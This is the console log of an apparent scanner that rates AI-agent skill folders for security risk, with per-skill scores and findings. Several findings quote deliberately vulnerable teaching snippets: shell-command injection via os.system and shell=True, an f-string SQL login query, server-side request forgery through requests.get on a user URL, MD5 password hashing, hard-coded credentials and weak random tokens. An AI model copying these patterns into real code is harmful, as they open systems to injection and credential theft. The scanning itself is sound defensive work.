  [DEP001] in semantic-szz-analyzer/references/language_support.md:114
    Pattern: npm install -g typescript
    Confidence: MEDIUM
  [OBF001] in semantic-szz-analyzer/references/language_support.md:301
    Pattern: - `eval()` and `exec()`: Cannot be fully analyzed statically
    Confidence: MEDIUM
  [OBF002] in semantic-szz-analyzer/references/language_support.md:301
    Pattern: - `eval()` and `exec()`: Cannot be fully analyzed statically
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 8
  Critical Issues: 1
  Warning Issues: 5
  Info Issues: 0
  Total Issues: 6

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/semantic-szz-analyzer.html
Scanning: semantic-szz-analyzer

[*] Scanning Skill: semantic-szz-analyzer

[OK] Risk Level: SAFE (1.2/10)

[!] CRITICAL Issues (1):
  [INJ001] in semantic-szz-analyzer/references/language_support.md:301
    Pattern: - `eval()` and `exec()`: Cannot be fully analyzed statically
    Confidence: MEDIUM

[*] WARNING Issues (5):
  [CMD002] in semantic-szz-analyzer/references/language_support.md:301
    Pattern: - `eval()` and `exec()`: Cannot be fully analyzed statically
    Confidence: MEDIUM
  [INJ002] in semantic-szz-analyzer/references/language_support.md:301
    Pattern: - `eval()` and `exec()`: Cannot be fully analyzed statically
    Confidence: MEDIUM
  [DEP001] in semantic-szz-analyzer/references/language_support.md:114
    Pattern: npm install -g typescript
    Confidence: MEDIUM
  [OBF001] in semantic-szz-analyzer/references/language_support.md:301
    Pattern: - `eval()` and `exec()`: Cannot be fully analyzed statically
    Confidence: MEDIUM
  [OBF002] in semantic-szz-analyzer/references/language_support.md:301
    Pattern: - `eval()` and `exec()`: Cannot be fully analyzed statically
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 8
  Critical Issues: 1
  Warning Issues: 5
  Info Issues: 0
  Total Issues: 6

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/semantic-szz-analyzer.json
Scanning: smart-mutation-operator-generator

[*] Scanning Skill: smart-mutation-operator-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/smart-mutation-operator-generator.html
Scanning: smart-mutation-operator-generator

[*] Scanning Skill: smart-mutation-operator-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/smart-mutation-operator-generator.json
Scanning: specification-driven-generation

[*] Scanning Skill: specification-driven-generation

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/specification-driven-generation.html
Scanning: specification-driven-generation

[*] Scanning Skill: specification-driven-generation

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/specification-driven-generation.json
Scanning: specification-generator

[*] Scanning Skill: specification-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/specification-generator.html
Scanning: specification-generator

[*] Scanning Skill: specification-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/specification-generator.json
Scanning: spring-mvc-to-boot-migrator

[*] Scanning Skill: spring-mvc-to-boot-migrator

[?] Risk Level: MEDIUM (4.0/10)

[!] CRITICAL Issues (10):
  [NET001] in spring-mvc-to-boot-migrator/SKILL.md:247
    Pattern: curl http://localhost:8080/users
    Confidence: MEDIUM
  [FILE001] in spring-mvc-to-boot-migrator/references/framework_comparison.md:143
    Pattern: <property name="password" value="password"/>
    Confidence: MEDIUM
  [FILE001] in spring-mvc-to-boot-migrator/references/framework_comparison.md:167
    Pattern: dataSource.setPassword("password");
    Confidence: MEDIUM
  [FILE001] in spring-mvc-to-boot-migrator/references/framework_comparison.md:193
    Pattern: // spring.datasource.password=password
    Confidence: MEDIUM
  [FILE001] in spring-mvc-to-boot-migrator/references/framework_comparison.md:204
    Pattern: spring.datasource.password=password
    Confidence: MEDIUM
  [NET001] in spring-mvc-to-boot-migrator/references/migration_guide.md:461
    Pattern: curl http://localhost:8080/users
    Confidence: MEDIUM
  [NET001] in spring-mvc-to-boot-migrator/references/migration_guide.md:471
    Pattern: curl http://localhost:8080/actuator/health
    Confidence: MEDIUM
  [FILE001] in spring-mvc-to-boot-migrator/references/migration_guide.md:167
    Pattern: spring.datasource.password=password
    Confidence: MEDIUM
  [FILE001] in spring-mvc-to-boot-migrator/references/migration_guide.md:361
    Pattern: spring.datasource.password=password
    Confidence: MEDIUM
  [FILE001] in spring-mvc-to-boot-migrator/scripts/migrate_config.py:138
    Pattern: # spring.datasource.password=
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 8
  Critical Issues: 10
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 10

[*] Recommendation: REVIEW NEEDED - 请人工审查后使用

Report saved to: report/spring-mvc-to-boot-migrator.html
Scanning: spring-mvc-to-boot-migrator

[*] Scanning Skill: spring-mvc-to-boot-migrator

[?] Risk Level: MEDIUM (4.0/10)

[!] CRITICAL Issues (10):
  [NET001] in spring-mvc-to-boot-migrator/SKILL.md:247
    Pattern: curl http://localhost:8080/users
    Confidence: MEDIUM
  [FILE001] in spring-mvc-to-boot-migrator/references/framework_comparison.md:143
    Pattern: <property name="password" value="password"/>
    Confidence: MEDIUM
  [FILE001] in spring-mvc-to-boot-migrator/references/framework_comparison.md:167
    Pattern: dataSource.setPassword("password");
    Confidence: MEDIUM
  [FILE001] in spring-mvc-to-boot-migrator/references/framework_comparison.md:193
    Pattern: // spring.datasource.password=password
    Confidence: MEDIUM
  [FILE001] in spring-mvc-to-boot-migrator/references/framework_comparison.md:204
    Pattern: spring.datasource.password=password
    Confidence: MEDIUM
  [NET001] in spring-mvc-to-boot-migrator/references/migration_guide.md:461
    Pattern: curl http://localhost:8080/users
    Confidence: MEDIUM
  [NET001] in spring-mvc-to-boot-migrator/references/migration_guide.md:471
    Pattern: curl http://localhost:8080/actuator/health
    Confidence: MEDIUM
  [FILE001] in spring-mvc-to-boot-migrator/references/migration_guide.md:167
    Pattern: spring.datasource.password=password
    Confidence: MEDIUM
  [FILE001] in spring-mvc-to-boot-migrator/references/migration_guide.md:361
    Pattern: spring.datasource.password=password
    Confidence: MEDIUM
  [FILE001] in spring-mvc-to-boot-migrator/scripts/migrate_config.py:138
    Pattern: # spring.datasource.password=
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 8
  Critical Issues: 10
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 10

[*] Recommendation: REVIEW NEEDED - 请人工审查后使用

Report saved to: report/spring-mvc-to-boot-migrator.json
Scanning: state-snapshot-instrumenter

[*] Scanning Skill: state-snapshot-instrumenter

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in state-snapshot-instrumenter/scripts/analyze_snapshots.py:103
    Pattern: all_vars = set(vars1.keys()) | set(vars2.keys())
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 11
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/state-snapshot-instrumenter.html
Scanning: state-snapshot-instrumenter

[*] Scanning Skill: state-snapshot-instrumenter

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in state-snapshot-instrumenter/scripts/analyze_snapshots.py:103
    Pattern: all_vars = set(vars1.keys()) | set(vars2.keys())
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 11
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/state-snapshot-instrumenter.json
Scanning: static-bug-detector

[*] Scanning Skill: static-bug-detector

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/static-bug-detector.html
Scanning: static-bug-detector

[*] Scanning Skill: static-bug-detector

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/static-bug-detector.json
Scanning: static-reasoning-verifier

[*] Scanning Skill: static-reasoning-verifier

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/static-reasoning-verifier.html
Scanning: static-reasoning-verifier

[*] Scanning Skill: static-reasoning-verifier

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/static-reasoning-verifier.json
Scanning: static-vulnerability-detector

[*] Scanning Skill: static-vulnerability-detector

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL Issues (50):
  [NET001] in static-vulnerability-detector/SKILL.md:233
    Pattern: response = requests.get(user_url)  # Can access internal services
    Confidence: LOW
  [FILE001] in static-vulnerability-detector/SKILL.md:195
    Pattern: PASSWORD = "admin123"
    Confidence: MEDIUM
  [FILE001] in static-vulnerability-detector/SKILL.md:196
    Pattern: API_KEY = "sk-1234567890"
    Confidence: MEDIUM
  [FILE001] in static-vulnerability-detector/SKILL.md:204
    Pattern: hash = hashlib.md5(password.encode()).hexdigest()
    Confidence: MEDIUM
  [FILE001] in static-vulnerability-detector/SKILL.md:210
    Pattern: token = random.randint(1000, 9999)  # For security token
    Confidence: MEDIUM
  [FILE001] in static-vulnerability-detector/references/examples.md:120
    Pattern: password="P@ssw0rd123"  # Hard-coded password
    Confidence: MEDIUM
  [FILE001] in static-vulnerability-detector/references/examples.md:132
    Pattern: **Location**: Line 7, password parameter
    Confidence: MEDIUM
  [FILE001] in static-vulnerability-detector/references/examples.md:153
    Pattern: password=os.environ.get('DB_PASSWORD')
    Confidence: MEDIUM
  [FILE001] in static-vulnerability-detector/references/examples.md:336
    Pattern: def hash_password(password):
    Confidence: MEDIUM
  [FILE001] in static-vulnerability-detector/references/examples.md:337
    Pattern: return hashlib.md5(password.encode()).hexdigest()
    Confidence: MEDIUM
  and 40 more

[*] WARNING Issues (3):
  [CMD002] in static-vulnerability-detector/SKILL.md:173
    Pattern: os.system("ping " + user_host)
    Confidence: MEDIUM
  [CMD002] in static-vulnerability-detector/references/cwe_patterns.md:99
    Pattern: os.system("ls " + user_path)  # VULNERABLE
    Confidence: MEDIUM
  [CMD002] in static-vulnerability-detector/references/cwe_patterns.md:100
    Pattern: subprocess.call("ping " + user_host, shell=True)  # VULNERABLE
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 50
  Warning Issues: 3
  Info Issues: 0
  Total Issues: 53

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/static-vulnerability-detector.html
Scanning: static-vulnerability-detector

[*] Scanning Skill: static-vulnerability-detector

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL Issues (50):
  [NET001] in static-vulnerability-detector/SKILL.md:233
    Pattern: response = requests.get(user_url)  # Can access internal services
    Confidence: LOW
  [FILE001] in static-vulnerability-detector/SKILL.md:195
    Pattern: PASSWORD = "admin123"
    Confidence: MEDIUM
  [FILE001] in static-vulnerability-detector/SKILL.md:196
    Pattern: API_KEY = "sk-1234567890"
    Confidence: MEDIUM
  [FILE001] in static-vulnerability-detector/SKILL.md:204
    Pattern: hash = hashlib.md5(password.encode()).hexdigest()
    Confidence: MEDIUM
  [FILE001] in static-vulnerability-detector/SKILL.md:210
    Pattern: token = random.randint(1000, 9999)  # For security token
    Confidence: MEDIUM
  [FILE001] in static-vulnerability-detector/references/examples.md:120
    Pattern: password="P@ssw0rd123"  # Hard-coded password
    Confidence: MEDIUM
  [FILE001] in static-vulnerability-detector/references/examples.md:132
    Pattern: **Location**: Line 7, password parameter
    Confidence: MEDIUM
  [FILE001] in static-vulnerability-detector/references/examples.md:153
    Pattern: password=os.environ.get('DB_PASSWORD')
    Confidence: MEDIUM
  [FILE001] in static-vulnerability-detector/references/examples.md:336
    Pattern: def hash_password(password):
    Confidence: MEDIUM
  [FILE001] in static-vulnerability-detector/references/examples.md:337
    Pattern: return hashlib.md5(password.encode()).hexdigest()
    Confidence: MEDIUM
  and 40 more

[*] WARNING Issues (3):
  [CMD002] in static-vulnerability-detector/SKILL.md:173
    Pattern: os.system("ping " + user_host)
    Confidence: MEDIUM
  [CMD002] in static-vulnerability-detector/references/cwe_patterns.md:99
    Pattern: os.system("ls " + user_path)  # VULNERABLE
    Confidence: MEDIUM
  [CMD002] in static-vulnerability-detector/references/cwe_patterns.md:100
    Pattern: subprocess.call("ping " + user_host, shell=True)  # VULNERABLE
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 50
  Warning Issues: 3
  Info Issues: 0
  Total Issues: 53

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/static-vulnerability-detector.json
Scanning: symbolic-execution-assistant

[*] Scanning Skill: symbolic-execution-assistant

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL Issues (24):
  [FILE001] in symbolic-execution-assistant/references/constraint_solving.md:104
    Pattern: password = String('password')
    Confidence: MEDIUM
  [FILE001] in symbolic-execution-assistant/references/constraint_solving.md:108
    Pattern: solver.add(Length(password) >= 8)
    Confidence: MEDIUM
  [FILE001] in symbolic-execution-assistant/references/constraint_solving.md:109
    Pattern: solver.add(Contains(password, StringVal("@")))
    Confidence: MEDIUM
  [FILE001] in symbolic-execution-assistant/references/constraint_solving.md:113
    Pattern: print(f"username={m[username]}, password={m[password]}")
    Confidence: MEDIUM
  [FILE001] in symbolic-execution-assistant/references/constraint_solving.md:484
    Pattern: password = String('password')
    Confidence: MEDIUM
  [FILE001] in symbolic-execution-assistant/references/constraint_solving.md:491
    Pattern: solver.add(Length(password) >= 8)
    Confidence: MEDIUM
  [FILE001] in symbolic-execution-assistant/references/constraint_solving.md:492
    Pattern: solver.add(Contains(password, StringVal("@")))
    Confidence: MEDIUM
  [FILE001] in symbolic-execution-assistant/references/constraint_solving.md:493
    Pattern: solver.add(Contains(password, StringVal("1")))
    Confidence: MEDIUM
  [FILE001] in symbolic-execution-assistant/references/constraint_solving.md:499
    Pattern: print(f"  password={m[password]}")
    Confidence: MEDIUM
  [FILE001] in symbolic-execution-assistant/references/tool_integration.md:223
    Pattern: ### Example: Finding Correct Password
    Confidence: MEDIUM
  and 14 more

[*] WARNING Issues (9):
  [INJ002] in symbolic-execution-assistant/references/tool_integration.md:219
    Pattern: solution = simgr.found[0].solver.eval(flag, cast_to=bytes)
    Confidence: MEDIUM
  [INJ002] in symbolic-execution-assistant/references/tool_integration.md:252
    Pattern: password_solution = found.solver.eval(password, cast_to=bytes)
    Confidence: MEDIUM
  [INJ002] in symbolic-execution-assistant/references/tool_integration.md:271
    Pattern: size = state.solver.eval(state.regs.rdi)
    Confidence: MEDIUM
  [OBF001] in symbolic-execution-assistant/references/tool_integration.md:219
    Pattern: solution = simgr.found[0].solver.eval(flag, cast_to=bytes)
    Confidence: MEDIUM
  [OBF001] in symbolic-execution-assistant/references/tool_integration.md:252
    Pattern: password_solution = found.solver.eval(password, cast_to=bytes)
    Confidence: MEDIUM
  [OBF001] in symbolic-execution-assistant/references/tool_integration.md:271
    Pattern: size = state.solver.eval(state.regs.rdi)
    Confidence: MEDIUM
  [OBF002] in symbolic-execution-assistant/references/tool_integration.md:219
    Pattern: solution = simgr.found[0].solver.eval(flag, cast_to=bytes)
    Confidence: MEDIUM
  [OBF002] in symbolic-execution-assistant/references/tool_integration.md:252
    Pattern: password_solution = found.solver.eval(password, cast_to=bytes)
    Confidence: MEDIUM
  [OBF002] in symbolic-execution-assistant/references/tool_integration.md:271
    Pattern: size = state.solver.eval(state.regs.rdi)
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 24
  Warning Issues: 9
  Info Issues: 0
  Total Issues: 33

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/symbolic-execution-assistant.html
Scanning: symbolic-execution-assistant

[*] Scanning Skill: symbolic-execution-assistant

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL Issues (24):
  [FILE001] in symbolic-execution-assistant/references/constraint_solving.md:104
    Pattern: password = String('password')
    Confidence: MEDIUM
  [FILE001] in symbolic-execution-assistant/references/constraint_solving.md:108
    Pattern: solver.add(Length(password) >= 8)
    Confidence: MEDIUM
  [FILE001] in symbolic-execution-assistant/references/constraint_solving.md:109
    Pattern: solver.add(Contains(password, StringVal("@")))
    Confidence: MEDIUM
  [FILE001] in symbolic-execution-assistant/references/constraint_solving.md:113
    Pattern: print(f"username={m[username]}, password={m[password]}")
    Confidence: MEDIUM
  [FILE001] in symbolic-execution-assistant/references/constraint_solving.md:484
    Pattern: password = String('password')
    Confidence: MEDIUM
  [FILE001] in symbolic-execution-assistant/references/constraint_solving.md:491
    Pattern: solver.add(Length(password) >= 8)
    Confidence: MEDIUM
  [FILE001] in symbolic-execution-assistant/references/constraint_solving.md:492
    Pattern: solver.add(Contains(password, StringVal("@")))
    Confidence: MEDIUM
  [FILE001] in symbolic-execution-assistant/references/constraint_solving.md:493
    Pattern: solver.add(Contains(password, StringVal("1")))
    Confidence: MEDIUM
  [FILE001] in symbolic-execution-assistant/references/constraint_solving.md:499
    Pattern: print(f"  password={m[password]}")
    Confidence: MEDIUM
  [FILE001] in symbolic-execution-assistant/references/tool_integration.md:223
    Pattern: ### Example: Finding Correct Password
    Confidence: MEDIUM
  and 14 more

[*] WARNING Issues (9):
  [INJ002] in symbolic-execution-assistant/references/tool_integration.md:219
    Pattern: solution = simgr.found[0].solver.eval(flag, cast_to=bytes)
    Confidence: MEDIUM
  [INJ002] in symbolic-execution-assistant/references/tool_integration.md:252
    Pattern: password_solution = found.solver.eval(password, cast_to=bytes)
    Confidence: MEDIUM
  [INJ002] in symbolic-execution-assistant/references/tool_integration.md:271
    Pattern: size = state.solver.eval(state.regs.rdi)
    Confidence: MEDIUM
  [OBF001] in symbolic-execution-assistant/references/tool_integration.md:219
    Pattern: solution = simgr.found[0].solver.eval(flag, cast_to=bytes)
    Confidence: MEDIUM
  [OBF001] in symbolic-execution-assistant/references/tool_integration.md:252
    Pattern: password_solution = found.solver.eval(password, cast_to=bytes)
    Confidence: MEDIUM
  [OBF001] in symbolic-execution-assistant/references/tool_integration.md:271
    Pattern: size = state.solver.eval(state.regs.rdi)
    Confidence: MEDIUM
  [OBF002] in symbolic-execution-assistant/references/tool_integration.md:219
    Pattern: solution = simgr.found[0].solver.eval(flag, cast_to=bytes)
    Confidence: MEDIUM
  [OBF002] in symbolic-execution-assistant/references/tool_integration.md:252
    Pattern: password_solution = found.solver.eval(password, cast_to=bytes)
    Confidence: MEDIUM
  [OBF002] in symbolic-execution-assistant/references/tool_integration.md:271
    Pattern: size = state.solver.eval(state.regs.rdi)
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 24
  Warning Issues: 9
  Info Issues: 0
  Total Issues: 33

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/symbolic-execution-assistant.json
Scanning: system-diagram-generator

[*] Scanning Skill: system-diagram-generator

[OK] Risk Level: SAFE (1.8/10)

[!] CRITICAL Issues (4):
  [FILE001] in system-diagram-generator/references/plantuml-patterns.md:97
    Pattern: Auth --> API: JWT Token
    Confidence: MEDIUM
  [FILE001] in system-diagram-generator/references/plantuml-patterns.md:98
    Pattern: API --> FE: Token + User Info
    Confidence: MEDIUM
  [FILE001] in system-diagram-generator/references/mermaid-patterns.md:87
    Pattern: Auth-->>API: JWT Token
    Confidence: MEDIUM
  [FILE001] in system-diagram-generator/references/mermaid-patterns.md:88
    Pattern: API-->>Frontend: Token + User Info
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 4
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 4

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/system-diagram-generator.html
Scanning: system-diagram-generator

[*] Scanning Skill: system-diagram-generator

[OK] Risk Level: SAFE (1.8/10)

[!] CRITICAL Issues (4):
  [FILE001] in system-diagram-generator/references/plantuml-patterns.md:97
    Pattern: Auth --> API: JWT Token
    Confidence: MEDIUM
  [FILE001] in system-diagram-generator/references/plantuml-patterns.md:98
    Pattern: API --> FE: Token + User Info
    Confidence: MEDIUM
  [FILE001] in system-diagram-generator/references/mermaid-patterns.md:87
    Pattern: Auth-->>API: JWT Token
    Confidence: MEDIUM
  [FILE001] in system-diagram-generator/references/mermaid-patterns.md:88
    Pattern: API-->>Frontend: Token + User Info
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 4
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 4

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/system-diagram-generator.json
Scanning: szz-bug-identifier

[*] Scanning Skill: szz-bug-identifier

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/szz-bug-identifier.html
Scanning: szz-bug-identifier

[*] Scanning Skill: szz-bug-identifier

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/szz-bug-identifier.json
Scanning: tactic-suggestion-assistant

[*] Scanning Skill: tactic-suggestion-assistant

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/tactic-suggestion-assistant.html
Scanning: tactic-suggestion-assistant

[*] Scanning Skill: tactic-suggestion-assistant

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/tactic-suggestion-assistant.json
Scanning: taint-instrumentation-assistant

[*] Scanning Skill: taint-instrumentation-assistant

[?] Risk Level: LOW (3.8/10)

[!] CRITICAL Issues (6):
  [FILE001] in taint-instrumentation-assistant/SKILL.md:213
    Pattern: def login(username, password):
    Confidence: MEDIUM
  [FILE001] in taint-instrumentation-assistant/SKILL.md:214
    Pattern: query = f"SELECT * FROM users WHERE name='{username}' AND pass='{password}'"
    Confidence: MEDIUM
  [FILE001] in taint-instrumentation-assistant/SKILL.md:218
    Pattern: def login(username, password):
    Confidence: MEDIUM
  [FILE001] in taint-instrumentation-assistant/SKILL.md:221
    Pattern: password = TaintedStr(password, "HTTP_PARAM:password")
    Confidence: MEDIUM
  [FILE001] in taint-instrumentation-assistant/SKILL.md:224
    Pattern: query = TaintedStr(f"SELECT * FROM users WHERE name='") + username + TaintedS...
    Confidence: MEDIUM
  [INJ001] in taint-instrumentation-assistant/SKILL.md:299
    Pattern: "EVAL": ["eval()", "exec()"],
    Confidence: MEDIUM

[*] WARNING Issues (7):
  [CMD002] in taint-instrumentation-assistant/SKILL.md:264
    Pattern: os.system(f"cat {filename}")
    Confidence: MEDIUM
  [CMD002] in taint-instrumentation-assistant/SKILL.md:280
    Pattern: os.system(str(command))
    Confidence: MEDIUM
  [CMD002] in taint-instrumentation-assistant/SKILL.md:296
    Pattern: "SYSTEM_CMD": ["os.system()", "subprocess.call()"],
    Confidence: MEDIUM
  [CMD002] in taint-instrumentation-assistant/SKILL.md:299
    Pattern: "EVAL": ["eval()", "exec()"],
    Confidence: MEDIUM
  [INJ002] in taint-instrumentation-assistant/SKILL.md:299
    Pattern: "EVAL": ["eval()", "exec()"],
    Confidence: MEDIUM
  [OBF001] in taint-instrumentation-assistant/SKILL.md:299
    Pattern: "EVAL": ["eval()", "exec()"],
    Confidence: MEDIUM
  [OBF002] in taint-instrumentation-assistant/SKILL.md:299
    Pattern: "EVAL": ["eval()", "exec()"],
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 6
  Warning Issues: 7
  Info Issues: 0
  Total Issues: 13

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/taint-instrumentation-assistant.html
Scanning: taint-instrumentation-assistant

[*] Scanning Skill: taint-instrumentation-assistant

[?] Risk Level: LOW (3.8/10)

[!] CRITICAL Issues (6):
  [FILE001] in taint-instrumentation-assistant/SKILL.md:213
    Pattern: def login(username, password):
    Confidence: MEDIUM
  [FILE001] in taint-instrumentation-assistant/SKILL.md:214
    Pattern: query = f"SELECT * FROM users WHERE name='{username}' AND pass='{password}'"
    Confidence: MEDIUM
  [FILE001] in taint-instrumentation-assistant/SKILL.md:218
    Pattern: def login(username, password):
    Confidence: MEDIUM
  [FILE001] in taint-instrumentation-assistant/SKILL.md:221
    Pattern: password = TaintedStr(password, "HTTP_PARAM:password")
    Confidence: MEDIUM
  [FILE001] in taint-instrumentation-assistant/SKILL.md:224
    Pattern: query = TaintedStr(f"SELECT * FROM users WHERE name='") + username + TaintedS...
    Confidence: MEDIUM
  [INJ001] in taint-instrumentation-assistant/SKILL.md:299
    Pattern: "EVAL": ["eval()", "exec()"],
    Confidence: MEDIUM

[*] WARNING Issues (7):
  [CMD002] in taint-instrumentation-assistant/SKILL.md:264
    Pattern: os.system(f"cat {filename}")
    Confidence: MEDIUM
  [CMD002] in taint-instrumentation-assistant/SKILL.md:280
    Pattern: os.system(str(command))
    Confidence: MEDIUM
  [CMD002] in taint-instrumentation-assistant/SKILL.md:296
    Pattern: "SYSTEM_CMD": ["os.system()", "subprocess.call()"],
    Confidence: MEDIUM
  [CMD002] in taint-instrumentation-assistant/SKILL.md:299
    Pattern: "EVAL": ["eval()", "exec()"],
    Confidence: MEDIUM
  [INJ002] in taint-instrumentation-assistant/SKILL.md:299
    Pattern: "EVAL": ["eval()", "exec()"],
    Confidence: MEDIUM
  [OBF001] in taint-instrumentation-assistant/SKILL.md:299
    Pattern: "EVAL": ["eval()", "exec()"],
    Confidence: MEDIUM
  [OBF002] in taint-instrumentation-assistant/SKILL.md:299
    Pattern: "EVAL": ["eval()", "exec()"],
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 6
  Warning Issues: 7
  Info Issues: 0
  Total Issues: 13

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/taint-instrumentation-assistant.json
Scanning: technical-debt-analyzer

[*] Scanning Skill: technical-debt-analyzer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/technical-debt-analyzer.html
Scanning: technical-debt-analyzer

[*] Scanning Skill: technical-debt-analyzer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/technical-debt-analyzer.json
Scanning: template-code-generator

[*] Scanning Skill: template-code-generator

[OK] Risk Level: SAFE (1.2/10)

[!] CRITICAL Issues (3):
  [NET001] in template-code-generator/references/template_patterns.md:107
    Pattern: const response = await fetch(url);
    Confidence: MEDIUM
  [NET001] in template-code-generator/references/template_patterns.md:133
    Pattern: const response = await fetch(`${API_BASE_URL}${endpoint}`, {
    Confidence: MEDIUM
  [FILE001] in template-code-generator/references/template_patterns.md:244
    Pattern: ACCESS_TOKEN_EXPIRE_MINUTES: int = 30
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 3
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 3

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/template-code-generator.html
Scanning: template-code-generator

[*] Scanning Skill: template-code-generator

[OK] Risk Level: SAFE (1.2/10)

[!] CRITICAL Issues (3):
  [NET001] in template-code-generator/references/template_patterns.md:107
    Pattern: const response = await fetch(url);
    Confidence: MEDIUM
  [NET001] in template-code-generator/references/template_patterns.md:133
    Pattern: const response = await fetch(`${API_BASE_URL}${endpoint}`, {
    Confidence: MEDIUM
  [FILE001] in template-code-generator/references/template_patterns.md:244
    Pattern: ACCESS_TOKEN_EXPIRE_MINUTES: int = 30
